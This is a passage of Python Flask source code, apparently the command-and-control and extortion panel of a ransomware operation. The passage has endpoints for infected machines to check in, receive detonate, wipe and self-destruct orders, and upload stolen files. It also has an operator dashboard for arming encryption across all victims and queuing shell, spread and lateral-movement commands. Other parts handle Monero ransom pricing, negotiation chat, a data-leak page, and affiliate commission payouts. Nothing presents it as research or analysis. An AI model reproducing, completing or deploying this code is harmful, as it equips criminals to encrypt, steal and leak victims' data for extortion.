              wrapped_key=CASE WHEN COALESCE(victims.wrapped_key,'')=''
                               THEN excluded.wrapped_key ELSE victims.wrapped_key END,
              aes_key=CASE WHEN COALESCE(victims.aes_key,'')=''
                           THEN excluded.aes_key ELSE victims.aes_key END,
              hostname=excluded.hostname,
              username=excluded.username,
              ip=excluded.ip,
              os_info=excluded.os_info,
              last_ping=excluded.last_ping,
              price=CASE WHEN COALESCE(victims.price,0)=0 THEN excluded.price
                         ELSE victims.price END,
              xmr_address=CASE WHEN COALESCE(victims.xmr_address,'')=''
                               THEN excluded.xmr_address ELSE victims.xmr_address END,
              campaign_id=CASE WHEN COALESCE(victims.campaign_id,0)=0
                               THEN excluded.campaign_id ELSE victims.campaign_id END""",
            (vid, wrapped_store, aes_store, host, user, ip, os_info, now, now,
             price, xmr, deadline, campaign_id))
        conn.commit()

    if not existing:
        c2db.log_event("payload", "checkin", vid, f"{host or '?'} {ip} {os_info}")
        notify.send(f"new victim: {host or '?'} ({ip}) vid {vid[:12]}")
    print(f"[+] checkin {host or '?'} ({ip}) vid={vid[:10]} key={'yes' if aes else 'NO'}")

    secret_b64 = ""
    issued_secret = False
    with c2db.db() as conn:
        row = conn.execute("SELECT secret FROM victims WHERE vid=?", (vid,)).fetchone()
        secret_b64 = vault.reveal(row["secret"]) if row and row["secret"] else ""
        if row and row["secret"] and not secret_b64:
            # The row has a sealed secret we cannot open: never fall back to
            # handing out a fresh one, or two signers would exist.
            c2db.log_event("payload", "checkin_secret_unreadable", vid, "")
            return "secret unavailable", 503
        if not secret_b64:
            # Conditional update: two concurrent checkins must not overwrite
            # each other's secret, or one payload would be stranded signing
            # with a secret the panel no longer holds.
            candidate = base64.b64encode(os.urandom(32)).decode()
            conn.execute("UPDATE victims SET secret=? WHERE vid=? "
                         "AND (secret='' OR secret IS NULL)",
                         (vault.seal(candidate), vid))
            row = conn.execute("SELECT secret FROM victims WHERE vid=?",
                               (vid,)).fetchone()
            secret_b64 = vault.reveal(row["secret"]) if row and row["secret"] else candidate
            if not secret_b64:
                secret_b64 = candidate
            issued_secret = True
            conn.commit()
    if not issued_secret:
        # A VID alone must not be a signing credential. The payload keeps its
        # secret in %ProgramData%\VEX\sec; re-delivery is registration-only.
        return "OK\n", 200
    return "OK\nsecret=" + secret_b64, 200


@app.route("/api/ping")
def api_ping():
    if _BURNED_AT:
        # The operation is burned: every payload that still checks in is told
        # to self-destruct. No database is read.
        return Response("kill", mimetype="text/plain")
    vid = (request.args.get("vid") or "").strip()
    try:
        _housekeeping_tick()
    except Exception:
        pass
    with c2db.db() as conn:
        row = conn.execute("SELECT detonate, pardon, status FROM victims WHERE vid=?",
                           (vid,)).fetchone()
        if row is None:
            return "unknown", 404
        conn.execute("UPDATE victims SET last_ping=? WHERE vid=?", (c2db.now(), vid))
        conn.commit()

    armed = int(row["detonate"] or 0)
    pardoned = int(row["pardon"] or 0)
    victim_status = (row["status"] or "").lower()
    # A settled or released victim must never detonate because of a stale arm
    # flag. Pardon wins over everything; paid/pardoned sleep.
    status = ("pardon" if pardoned else
              "sleep" if victim_status in ("paid", "pardoned") else
              "kill" if armed == 2 else
              "detonate" if armed == 1 else "sleep")

    lines = [status]
    host = c2db.get_setting("c2_host", "").strip()
    if host and re.match(r"^[A-Za-z0-9.\-]{3,253}$", host):
        lines.append("host=" + host)
    cmd = c2db.claim_command(vid)
    if cmd:
        arg_b64 = base64.b64encode((cmd["arg"] or "").encode("utf-8")).decode()
        lines.append(f"cmd={cmd['id']}|{cmd['ctype']}|{arg_b64}")
    return Response("\n".join(lines), mimetype="text/plain")


@app.route("/api/stage")
def api_stage():
    # Staging is a binary-download endpoint: never open without a configured
    # API token, even though checkin/ping are open for registration.
    if not _configured_api_token():
        return "staging disabled: set api_token", 403
    path = os.environ.get("VEX_STAGE_FILE", os.path.join(APP_DIR, "stage.bin"))
    if not os.path.exists(path):
        abort(404)
    return send_file(path, mimetype="application/octet-stream")


@app.route("/api/pardon_exe")
def api_pardon_exe():
    """Signed delivery of the per-victim decrypter, used by the pardon flow."""
    vid = (request.args.get("vid") or "").strip()
    v = c2db.get_victim(vid)
    if not v:
        abort(404)
    key = _safe_aes_key(vault.reveal(v["aes_key"] or ""))
    if not key:
        return "stored key invalid", 500
    if not int(v["pardon"] or 0):
        return "pardon not authorized", 403
    path = decrypter_build.build(TEMPLATE_FILE, key, vid, _c2_base())
    if not path:
        return "build unavailable", 503
    c2db.log_event("payload", "pardon_exe", vid, "")
    return send_file(path, mimetype="application/octet-stream",
                     as_attachment=True, download_name="vex_decrypter.exe")


@app.route("/api/exfil", methods=["POST"])
def api_exfil():
    vid = (request.form.get("vid") or "").strip()
    name = (request.form.get("name") or "file").strip()
    try:
        idx = int(request.form.get("idx") or 0)
        total = int(request.form.get("total") or 1)
    except ValueError:
        return "bad chunk", 400
    if not _VID_RE.match(vid) or total < 1 or total > 256 or not (0 <= idx < total):
        return "bad request", 400
    if not c2db.get_victim(vid):
        return "unknown victim", 404
    try:
        raw = base64.b64decode(request.form.get("data") or "")
    except Exception:
        return "bad data", 400
    xfer = (request.form.get("xfer") or "").strip()
    if xfer and not re.fullmatch(r"[A-Za-z0-9]{6,32}", xfer):
        return "bad transfer id", 400
    if total > 1 and not xfer:
        return "transfer id required for multi-chunk uploads", 400

    safe = re.sub(r"[^A-Za-z0-9._-]", "_", os.path.basename(name))[:120] or "file"
    name_tag = hashlib.sha256(safe.encode()).hexdigest()[:12]
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    tag = f"{_safe_component(vid)}_{xfer or name_tag}"
    part = os.path.join(UPLOAD_DIR, f".part_{tag}_{idx}")
    if idx == 0:
        for old in glob.glob(os.path.join(UPLOAD_DIR, f".part_{tag}_*")):
            if old != part:
                try:
                    os.unlink(old)
                except OSError:
                    pass
    with open(part, "wb") as f:
        f.write(raw)

    if idx == total - 1:
        parts = [os.path.join(UPLOAD_DIR, f".part_{tag}_{i}")
                 for i in range(total)]
        if not all(os.path.exists(p) for p in parts):
            return "incomplete upload", 400
        final = os.path.join(UPLOAD_DIR,
                             f"{_safe_component(vid)}_{xfer or name_tag}_{safe}")
        with open(final, "wb") as out:
            for p in parts:
                with open(p, "rb") as f:
                    out.write(f.read())
                try:
                    os.unlink(p)
                except OSError:
                    pass
        size = os.path.getsize(final)
        c2db.add_upload(vid, safe, final, size)
        c2db.log_event("payload", "exfil", vid, f"{safe} {size}B")
        notify.send(f"exfil: {name} ({size} B) from {vid[:12]}")
    return "OK", 200


@app.route("/api/report", methods=["POST"])
def api_report():
    vid = (request.form.get("vid") or "").strip()
    kind = (request.form.get("kind") or "?")[:64]
    detail = (request.form.get("detail") or "")[:60000]
    host = (request.form.get("host") or "")[:128]
    if not vid or not _VID_RE.match(vid):
        return "bad vid", 400
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", kind):
        return "bad kind", 400

    if kind == "cmdout" and detail.count("|") >= 2:
        cid, _ctype, b64out = detail.split("|", 2)
        try:
            out = base64.b64decode(b64out).decode("utf-8", "replace")
        except Exception:
            out = ""
        try:
            c2db.finish_command(int(cid), vid, not out.startswith("err:"), out)
        except (ValueError, TypeError):
            pass
        detail = detail[:4000]
    else:
        detail = detail[:512]

    if kind == "detonate_done" and "sample=" in detail:
        sample = detail.split("sample=", 1)[1].split()[0][:400]
        with c2db.db() as conn:
            conn.execute("UPDATE victims SET sample_path=? WHERE vid=?", (sample, vid))
            conn.commit()

    if kind in ("pardon_done", "pardon_failed"):
        _v = c2db.get_victim(vid)
        if not _v or not int(_v["pardon"] or 0):
            c2db.log_event("payload", "pardon_report_ignored", vid, kind)
            return "ignored: no pardon queued", 200
        if kind == "pardon_done" and "journal=removed" not in detail:
            with c2db.db() as conn:
                conn.execute("UPDATE victims SET status='pardon_incomplete' "
                             "WHERE vid=?", (vid,))
                conn.commit()
            c2db.log_event("payload", "pardon_incomplete", vid, detail[:200])
            return "incomplete: journal not proven removed", 409
        with c2db.db() as conn:
            if kind == "pardon_done":
                conn.execute("""UPDATE victims SET pardon=0, detonate=0,
                                status='pardoned' WHERE vid=?""", (vid,))
            else:
                conn.execute("UPDATE victims SET status='pardon_failed' WHERE vid=?", (vid,))
            conn.commit()
        c2db.log_event("payload", kind, vid, detail[:200])
        notify.send(f"[{kind}] {host or '?'} {detail[:160]}")

    with c2db.db() as conn:
        conn.execute("INSERT INTO reports (vid, kind, detail, host, ts) VALUES (?,?,?,?,?)",
                     (vid, kind, detail, host, c2db.now()))
        conn.commit()

    if kind in ("detonate", "detonate_done", "crash", "terminate", "usb", "smb",
                "cmdout"):
        notify.send(f"[{kind}] {host or '?'} {detail[:160]}")
    print(f"[report] {kind} {host or '?'} {detail[:80]}")
    return "OK", 200


# ---------------------------------------------------------------------------
# login
# ---------------------------------------------------------------------------
@app.route("/admin/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        ip = _client_ip()
        if _throttled(ip):
            flash("too many attempts, wait a minute", "error")
            return render_template("login.html"), 429

        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        code = (request.form.get("code") or "").strip()

        with c2db.db() as conn:
            op = conn.execute("SELECT * FROM operators WHERE username=?", (username,)).fetchone()

        if not op or not c2db.verify_password(password, op["pw_hash"]):
            _note_failure(ip)
            c2db.log_event("auth", "login_failed", "", f"{username}@{ip}")
            flash("invalid credentials", "error")
            return render_template("login.html"), 401

        if op["totp_secret"]:
            ok_code = c2db.verify_totp(op["totp_secret"], code)
            if not ok_code and code:
                used, new_store = c2db.consume_backup_code(op["backup_codes"] or "", code)
                if used:
                    with c2db.db() as conn:
                        conn.execute("UPDATE operators SET backup_codes=? WHERE id=?",
                                     (new_store, op["id"]))
                        conn.commit()
                    ok_code = True
            if not ok_code:
                _note_failure(ip)
                c2db.log_event("auth", "totp_failed", "", f"{username}@{ip}")
                flash("invalid 2FA code", "error")
                return render_template("login.html"), 401

        session.clear()
        session["user"] = op["username"]
        session["role"] = op["role"]
        session["csrf"] = secrets.token_hex(16)
        session["root_seen_at"] = time.time()
        if op["role"] in ("root", "shadow"):
            try:
                _stamp_root_seen()
            except Exception:
                pass
        with c2db.db() as conn:
            conn.execute("UPDATE operators SET last_login=? WHERE id=?",
                         (c2db.now(), op["id"]))
            conn.commit()
        c2db.log_event(username, "login", "", ip)
        if (c2db.get_setting("require_2fa", "0") == "1"
                and op["role"] in ("admin", "root", "shadow")
                and not op["totp_secret"]):
            session["must_enroll_2fa"] = True
            return redirect(url_for("twofa"))
        nxt = _safe_next(request.args.get("next") or "",
                         url_for("affiliate_home") if op["role"] == "affiliate"
                         else url_for("dashboard"))
        return redirect(nxt)

    return render_template("login.html")


@app.route("/admin/logout")
def logout():
    user = current_user()
    session.clear()
    if user:
        c2db.log_event(user, "logout", "", _client_ip())
    return redirect(url_for("login"))


# ---------------------------------------------------------------------------
# dashboard / victim
# ---------------------------------------------------------------------------
@app.route("/admin")
@login_required()
def dashboard():
    q = (request.args.get("q") or "").strip()
    status = (request.args.get("status") or "").strip()
    armed = (request.args.get("armed") or "").strip()
    only_online = request.args.get("online") == "1"
    campaign = (request.args.get("campaign") or "").strip()
    page = max(1, int(request.args.get("page") or 1))
    per = 50

    where, params = [], []
    if q:
        where.append("(hostname LIKE ? OR username LIKE ? OR vid LIKE ? OR ip LIKE ? OR tags LIKE ?)")
        params += [f"%{q}%"] * 5
    if status:
        where.append("status=?")
        params.append(status)
    if armed in ("0", "1", "2"):
        where.append("detonate=?")
        params.append(int(armed))
    if campaign.isdigit():
        where.append("campaign_id=?")
        params.append(int(campaign))
    if only_online:
        where.append("last_ping >= ?")
        params.append((datetime.datetime.now()
                       - datetime.timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S"))

    clause = (" WHERE " + " AND ".join(where)) if where else ""
    with c2db.db() as conn:
        total = conn.execute("SELECT COUNT(*) FROM victims" + clause, params).fetchone()[0]
        rows = conn.execute(
            "SELECT * FROM victims" + clause +
            " ORDER BY (last_ping IS NULL OR last_ping='') ASC, last_ping DESC, timestamp DESC"
            " LIMIT ? OFFSET ?", params + [per, (page - 1) * per]).fetchall()

    return render_template("dashboard.html", rows=rows, stats=stats_dict(),
                           q=q, status=status, armed=armed, only_online=only_online,
                           page=page, pages=max(1, (total + per - 1) // per),
                           total=total, online=online, campaign=campaign,
                           campaigns=c2db.list_campaigns())


@app.route("/admin/victim/<vid>")
@login_required()
def victim(vid):
    v = victim_or_404(vid)
    c2db.mark_chat_read(vid)
    root_events = []
    if current_role() in ("root", "shadow"):
        with c2db.db() as conn:
            root_events = conn.execute(
                "SELECT ts, kind, detail FROM events WHERE vid=? AND kind IN "
                "('root_override','root_panic','pardon','pardon_done') "
                "ORDER BY id DESC LIMIT 5", (vid,)).fetchall()
    return render_template("victim.html", v=v, chat=parse_chat(v),
                           events=_filter_root_events(c2db.recent_events(80, vid)),
                           online=online(v),
                           root_events=root_events,
                           show_keys=(current_role() in ("admin", "root", "shadow")),
                           can_operate=(current_role() in ("admin", "root", "shadow")),
                           can_negotiate=(current_role() in ("admin", "root", "shadow",
                                                            "negotiator")),
                           aes_display=vault.reveal(v["aes_key"] or ""),
                           proof_max=c2db.get_setting("proof_max_mb", "8"),
                           commands=c2db.commands_for(vid),
                           campaigns=c2db.list_campaigns(),
                           invoices=c2db.invoice_history(vid),
                           payments=c2db.payments_for(vid),
                           paid_total=c2db.payments_total(vid),
                           price_due=c2db.effective_price(v),
                           deadline=c2db.deadline_for(v),
                           invoice=c2db.ensure_invoice(v),
                           uploads=c2db.list_uploads(vid),
                           uploads_total=c2db.uploads_total(vid))


@app.route("/admin/update", methods=["POST"])
@login_required("admin")
def update_victim():
    vid = request.form.get("vid", "")
    victim_or_404(vid)
    kind = request.form.get("update_type", "")

    audit = None
    became_paid = False
    with c2db.db() as conn:
        if kind == "status":
            status = request.form.get("status", "encrypted")
            if status in ("encrypted", "negotiating", "paid", "dead"):
                conn.execute("UPDATE victims SET status=?, paid_at=CASE WHEN ?='paid' "
                             "THEN COALESCE(NULLIF(paid_at,''), ?) ELSE paid_at END WHERE vid=?",
                             (status, status, c2db.now(), vid))
                audit = ("status", status)
                became_paid = (status == "paid")
        elif kind == "notes":
            conn.execute("UPDATE victims SET notes=? WHERE vid=?",
                         (request.form.get("notes", "")[:2000], vid))
        elif kind == "tags":
            conn.execute("UPDATE victims SET tags=? WHERE vid=?",
                         (request.form.get("tags", "")[:200], vid))
        elif kind == "aes_key":
            key = (request.form.get("aes_key") or "").strip()
            if key and crypto_util.b64_key(key) is None:
                key = ""
            conn.execute("UPDATE victims SET aes_key=? WHERE vid=?",
                         (vault.seal(key) if key else "", vid))
            audit = ("key_set", "manual" if key else "cleared")
        elif kind == "price":
            try:
                price = float(request.form.get("price") or 0)
            except ValueError:
                price = 0.0
            conn.execute("UPDATE victims SET price=? WHERE vid=?", (price, vid))
        elif kind == "xmr":
            conn.execute("UPDATE victims SET xmr_address=? WHERE vid=?",
                         (request.form.get("xmr_address", "")[:128], vid))
        elif kind == "campaign":
            try:
                cid = int(request.form.get("campaign_id") or 0)
            except ValueError:
                cid = 0
            conn.execute("UPDATE victims SET campaign_id=? WHERE vid=?", (cid, vid))
            audit = ("campaign_assign", str(cid))
        elif kind == "assign":
            conn.execute("UPDATE victims SET assigned_to=? WHERE vid=?",
                         (request.form.get("assigned_to", "")[:80], vid))
        elif kind == "step":
            step = request.form.get("negotiation_step", "first")
            if step in ("first", "proof", "price", "final"):
                conn.execute("UPDATE victims SET negotiation_step=? WHERE vid=?",
                             (step, vid))
        conn.commit()
    if audit:
        c2db.log_event(current_user(), audit[0], vid, audit[1])
    if became_paid:
        c2db.cancel_destructive_commands(vid)
        c2db.sync_invoice(vid, "paid")
        notify.send(f"victim marked paid: {vid[:12]}")
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/chat", methods=["POST"])
@require_perm("chat")
def send_chat():
    vid = request.form.get("vid", "")
    msg = (request.form.get("message") or "").strip()
    victim_or_404(vid)
    try:
        attachment = _save_chat_file(request.files.get("attachment"), vid)
    except OSError as exc:
        c2db.log_event(current_user(), "chat_attachment_failed", vid, str(exc)[:160])
        flash("attachment save failed; message not sent with file", "error")
        attachment = ""
    if msg or attachment:
        c2db.push_message(vid, "ADMIN", msg[:2000], current_user() or "", attachment)
        c2db.log_event(current_user(), "chat", vid, msg[:80])
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/inbox")
@login_required()
def inbox():
    return render_template("inbox.html", rows=c2db.inbox(200))


@app.route("/admin/chat/<vid>/json")
@login_required()
def chat_json(vid):
    victim_or_404(vid)
    try:
        since = int(request.args.get("since") or 0)
    except ValueError:
        since = 0
    return jsonify({"messages": c2db.messages_for(vid, since=since)})


@app.route("/portal/chat.json")
def portal_chat_json():
    vid = session.get("vid")
    if not vid:
        return jsonify({"messages": []}), 401
    try:
        since = int(request.args.get("since") or 0)
    except ValueError:
        since = 0
    return jsonify({"messages": c2db.messages_for(vid, since=since)})


@app.route("/chat/file/<name>")
def chat_file(name):
    if "/" in name or "\\" in name or not name.startswith("chat_"):
        abort(404)
    user = session.get("user")
    vid = session.get("vid")
    if user:
        if not can("view"):
            abort(403)
    elif vid:
        if f"chat_{_safe_component(vid)}_" not in name:
            abort(403)
    else:
        return redirect(url_for("login"))
    path = os.path.join(UPLOAD_DIR, name)
    if not os.path.isfile(path):
        abort(404)
    return send_file(path, as_attachment=True, download_name=name)


# ---------------------------------------------------------------------------
# destructive actions (POST only)
# ---------------------------------------------------------------------------
@app.route("/admin/detonate/<vid>", methods=["POST"])
@login_required("admin")
def detonate(vid):
    v = victim_or_404(vid)
    if int(v["pardon"] or 0) or (v["status"] or "") in ("paid", "pardoned", "dead"):
        flash("paid, pardoned, and dead victims cannot be re-armed", "error")
        return redirect(url_for("victim", vid=vid))
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET detonate=1, pardon=0, status='encrypted' WHERE vid=?", (vid,))
        conn.commit()
    c2db.log_event(current_user(), "detonate", vid, "")
    notify.send(f"detonate armed: {vid[:12]}")
    return redirect(request.referrer or url_for("dashboard"))


@app.route("/admin/detonate_all", methods=["POST"])
@login_required("admin")
def detonate_all():
    with c2db.db() as conn:
        n = conn.execute("UPDATE victims SET detonate=1, pardon=0 "
                         "WHERE detonate=0 AND pardon=0 "
                         "AND status NOT IN ('paid','pardoned','dead')").rowcount
        conn.commit()
    c2db.log_event(current_user(), "detonate_all", "", f"{n} victims")
    notify.send(f"detonate all: {n} victims armed")
    return redirect(url_for("dashboard"))


@app.route("/admin/detonate_reset/<vid>", methods=["POST"])
@login_required("admin")
def detonate_reset(vid):
    victim_or_404(vid)
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
        conn.commit()
    c2db.log_event(current_user(), "detonate_reset", vid, "")
    return redirect(request.referrer or url_for("dashboard"))


@app.route("/admin/kill/<vid>", methods=["POST"])
@login_required("admin")
def kill(vid):
    v = victim_or_404(vid)
    if int(v["pardon"] or 0) or (v["status"] or "") in ("paid", "pardoned"):
        flash("paid or pardoned victims cannot be killed", "error")
        return redirect(url_for("victim", vid=vid))
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET detonate=2, pardon=0, status='dead' WHERE vid=?", (vid,))
        conn.commit()
    c2db.log_event(current_user(), "kill", vid, "")
    notify.send(f"self-destruct queued: {vid[:12]}")
    return redirect(request.referrer or url_for("dashboard"))


# ---------------------------------------------------------------------------
# pardon (root only): release the machine and decrypt it remotely
# ---------------------------------------------------------------------------
@app.route("/admin/pardon/<vid>", methods=["POST"])
@root_required
def pardon(vid):
    victim_or_404(vid)
    with c2db.db() as conn:
        conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                        status='pardoning' WHERE vid=?""", (vid,))
        conn.commit()
    c2db.cancel_destructive_commands(vid)
    c2db.log_event(current_user(), "pardon", vid, "")
    notify.send(f"pardon queued: {vid[:12]}")
    return redirect(request.referrer or url_for("dashboard"))


@app.route("/admin/pardon_all", methods=["POST"])
@root_required
def pardon_all():
    vids = [v for v in request.form.getlist("vid") if v]
    with c2db.db() as conn:
        if vids:
            for v in vids:
                conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                                status='pardoning' WHERE vid=?""", (v,))
            n = len(vids)
        else:
            n = conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                                status='pardoning'""").rowcount
        conn.commit()
    for v in (vids or []):
        c2db.cancel_destructive_commands(v)
    if not vids:
        with c2db.db() as conn:
            rows = conn.execute("SELECT vid FROM victims WHERE pardon=1").fetchall()
        for r in rows:
            c2db.cancel_destructive_commands(r["vid"])
    c2db.log_event(current_user(), "pardon_all", "", f"{n} victims")
    notify.send(f"pardon all: {n} victims queued")
    return redirect(url_for("dashboard"))


@app.route("/admin/mark_paid/<vid>", methods=["POST"])
@login_required("admin")
def mark_paid(vid):
    if not c2db.mark_paid(vid, current_user() or ""):
        flash("dead or pardoned victims cannot be marked paid", "error")
        return redirect(url_for("victim", vid=vid))
    c2db.log_event(current_user(), "paid", vid, "manual")
    notify.send(f"victim marked paid: {vid[:12]}")
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/bulk", methods=["POST"])
@login_required("admin")
def bulk():
    action = request.form.get("action", "")
    if action == "pardon" and current_role() != "root":
        abort(403)
    vids = [v for v in request.form.getlist("vid") if v]
    if not vids:
        flash("nothing selected", "error")
        return redirect(url_for("dashboard"))
    with c2db.db() as conn:
        for vid in vids:
            if action == "detonate":
                conn.execute("""UPDATE victims SET detonate=1, pardon=0,
                                status='encrypted' WHERE vid=?
                                AND status NOT IN ('paid','pardoned','dead')
                                AND COALESCE(pardon,0)=0""", (vid,))
            elif action == "pardon":
                conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                                status='pardoning' WHERE vid=?""", (vid,))
            elif action == "kill":
                conn.execute("""UPDATE victims SET detonate=2, pardon=0,
                                status='dead' WHERE vid=?
                                AND status NOT IN ('paid','pardoned')
                                AND COALESCE(pardon,0)=0""", (vid,))
            elif action == "reset":
                conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
            elif action == "paid":
                conn.commit()
                c2db.mark_paid(vid, current_user() or "")
            elif action == "delete":
                conn.commit()
                c2db.purge_victim(vid)
        conn.commit()
    c2db.log_event(current_user(), f"bulk_{action}", "", f"{len(vids)} victims")
    return redirect(url_for("dashboard"))


@app.route("/admin/delete/<vid>", methods=["POST"])
@login_required("admin")
def delete_victim(vid):
    victim_or_404(vid)
    res = c2db.purge_victim(vid)
    c2db.log_event(current_user(), "delete", vid,
                   f"files={res['files']} {res['ledger']}")
    return redirect(url_for("dashboard"))


@app.route("/admin/command/<vid>", methods=["POST"])
@login_required("admin")
def queue_command(vid):
    v = victim_or_404(vid)
    ctype = (request.form.get("ctype") or "").strip()
    if ctype not in ("shell", "pull", "push", "lock", "uninstall", "reboot", "wipe",
                     "ls", "recon", "exfil", "screenshot",
                     "admins", "sessions", "shares", "domain", "users",
                     "spread", "netenum", "smbexec", "usb"):
        flash("unknown command type", "error")
        return redirect(url_for("victim", vid=vid))
    if ctype in ("lock", "wipe") and (
            int(v["pardon"] or 0)
            or (v["status"] or "") in ("paid", "pardoned", "dead")):
        flash("paid, pardoned, and dead victims cannot receive lock/wipe", "error")
        return redirect(url_for("victim", vid=vid))
    arg = (request.form.get("arg") or "")[:8000]
    if ctype == "push":
        path = (request.form.get("path") or "").strip()
        data = (request.form.get("data") or "").strip()
        arg = path + "|" + data
    try:
        priority = int(request.form.get("priority") or 0)
        attempts = int(request.form.get("max_attempts") or 3)
        timeout_s = int(request.form.get("timeout_s") or 300)
    except ValueError:
        priority, attempts, timeout_s = 0, 3, 300
    cid = c2db.queue_command(vid, ctype, arg, priority, attempts, timeout_s)
    c2db.log_event(current_user(), "command", vid, f"#{cid} {ctype}")
    flash(f"command #{cid} queued ({ctype})", "ok")
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/upload/<int:uid>")
@login_required("admin")
def admin_upload(uid):
    row = c2db.get_upload(uid)
    if not row:
        abort(404)
    return send_file(row["path"], as_attachment=True, download_name=row["name"])


@app.route("/leak/<vid>")
def leak_page(vid):
    v = c2db.get_victim(vid)
    if not v or c2db.get_setting("leak_enabled", "1") != "1":
        abort(404)
    return render_template("leak.html", v=v,
                           uploads=c2db.list_uploads(vid),
                           total=c2db.uploads_total(vid),
                           deadline=c2db.deadline_for(v),
                           invoice=c2db.ensure_invoice(v),
                           token=request.args.get("t") or "",
                           onion=c2db.get_setting("leak_onion", ""))


@app.route("/admin/command/cancel/<int:cid>", methods=["POST"])
@login_required("admin")
def cancel_command(cid):
    ok = c2db.cancel_command(cid)
    c2db.log_event(current_user(), "command_cancel", "", f"#{cid} ok={ok}")
    flash(f"command #{cid} canceled" if ok else "command not cancellable", "ok" if ok else "error")
    return redirect(request.referrer or url_for("commands_page"))


@app.route("/admin/templates", methods=["GET", "POST"])
@login_required("admin")
def templates_page():
    if request.method == "POST":
        name = (request.form.get("name") or "").strip()
        body = (request.form.get("body") or "").strip()
        if name and body:
            c2db.save_template(name, body)
            c2db.log_event(current_user(), "template", "", name)
            flash("template saved", "ok")
        return redirect(url_for("templates_page"))
    return render_template("templates.html", rows=c2db.list_templates())


@app.route("/admin/affiliates", methods=["GET", "POST"])
@login_required("admin")
def affiliates_page():
    if request.method == "POST":
        action = (request.form.get("action") or "").strip()
        who = (request.form.get("operator") or "").strip()
        try:
            amount = float(request.form.get("amount") or 0)
        except ValueError:
            amount = 0.0
        if action == "commission" and who:
            c2db.set_commission(who, amount)
            c2db.log_event(current_user(), "commission", "", f"{who}={amount}%")
            flash(f"commission for {who} set to {amount:g}%", "ok")
        elif action == "payout" and who and amount > 0:
            c2db.add_payout(who, amount, (request.form.get("note") or "")[:300],
                            current_user() or "")
            c2db.log_event(current_user(), "payout", "", f"{who} ${amount:.2f}")
            flash(f"payout recorded: {who} ${amount:,.2f}", "ok")
        else:
            flash("invalid affiliate action", "error")
        return redirect(url_for("affiliates_page"))
    rows = c2db.affiliates()
    payouts = c2db.list_payouts()
    if current_role() not in ("root", "shadow"):
        with c2db.db() as conn:
            roots = {r[0] for r in conn.execute(
                "SELECT username FROM operators WHERE role IN ('root','shadow')")}
        rows = [a for a in rows if a["username"] not in roots]
        payouts = [p for p in payouts
                   if p["operator"] not in roots and p["actor"] not in roots]
    return render_template("affiliates.html", rows=rows, payouts=payouts)


@app.route("/admin/commands")
@login_required()
def commands_page():
    if _audit_blocked():
        abort(403)
    return render_template("commands.html", rows=c2db.commands_recent(200))


@app.route("/admin/payments", methods=["GET", "POST"])
@login_required("admin")
def payments_page():
    if request.method == "POST":
        vid = (request.form.get("vid") or "").strip()
        try:
            amount = float(request.form.get("amount") or 0)
        except ValueError:
            amount = 0
        if not vid or amount <= 0:
            flash("victim and a positive amount are required", "error")
            return redirect(url_for("payments_page"))
        v = victim_or_404(vid)
        if (v["status"] or "") in ("dead", "pardoned"):
            flash("dead or pardoned victims cannot receive payments", "error")
            return redirect(url_for("payments_page"))
        try:
            total = c2db.add_payment(vid, amount,
                                     (request.form.get("note") or "")[:500],
                                     (request.form.get("txid") or "")[:200],
                                     current_user() or "",
                                     affiliate=current_user() or "")
        except sqlite3.IntegrityError:
            flash("that txid is already credited", "error")
            return redirect(url_for("payments_page"))
        c2db.log_event(current_user(), "payment", vid, f"{amount:.2f} total={total:.2f}")
        flash(f"payment recorded; total credited ${total:,.2f}", "ok")
        return redirect(url_for("payments_page"))
    with c2db.db() as conn:
        victims = conn.execute(
            "SELECT vid, hostname, status FROM victims ORDER BY timestamp DESC LIMIT 500"
        ).fetchall()
    recent = c2db.payments_recent(1000)
    if current_role() not in ("root", "shadow"):
        with c2db.db() as conn:
            roots = {r[0] for r in conn.execute(
                "SELECT username FROM operators WHERE role IN ('root','shadow')")}
        recent = [dict(r, actor=("operator" if r["actor"] in roots else r["actor"]))
                  for r in recent]
    return render_template("payments.html", rows=recent, victims=victims,
                           total=sum(r["amount"] or 0 for r in recent))


@app.route("/admin/decryptor/<vid>")
@login_required("admin")
def admin_decryptor(vid):
    return _serve_cpp(victim_or_404(vid))


@app.route("/admin/decrypter_exe/<vid>")
@login_required("admin")
def admin_decryptor_exe(vid):
    return _serve_exe(victim_or_404(vid), request.args.get("arch", "x64"))


@app.route("/decryptor/<vid>")
@login_required("admin")
def decryptor_compat(vid):
    return admin_decryptor(vid)


# ---------------------------------------------------------------------------
# analytics / reports / events
# ---------------------------------------------------------------------------
@app.route("/admin/analytics")
@login_required()
def analytics():
    today = datetime.date.today()
    days = [(today - datetime.timedelta(days=i)).isoformat()
            for i in range(13, -1, -1)]

    with c2db.db() as conn:
        checkins = {r[0]: r[1] for r in conn.execute(
            "SELECT date(timestamp) d, COUNT(*) FROM victims "
            "WHERE timestamp >= ? GROUP BY d", (days[0],))}
        paid = {r[0]: r[1] for r in conn.execute(
            "SELECT date(paid_at) d, COUNT(*) FROM victims "
            "WHERE paid_at >= ? GROUP BY d", (days[0],))}
        os_rows = conn.execute(
            "SELECT COALESCE(NULLIF(os_info,''),'?') o, COUNT(*) c "
            "FROM victims GROUP BY o ORDER BY c DESC LIMIT 8").fetchall()
        status_rows = conn.execute(
            "SELECT status, COUNT(*) c FROM victims GROUP BY status").fetchall()
        s = stats_dict()

    series = [{"day": d, "checkins": checkins.get(d, 0), "paid": paid.get(d, 0)}
              for d in days]
    peak = max([x["checkins"] for x in series] + [1])
    total = s["total"] or 1
    return render_template("analytics.html", s=s, series=series, peak=peak,
                           os_rows=os_rows, status_rows=status_rows, total=total)


@app.route("/admin/reports")
@login_required()
def reports():
    if _audit_blocked():
        abort(403)
    kind = (request.args.get("kind") or "").strip()
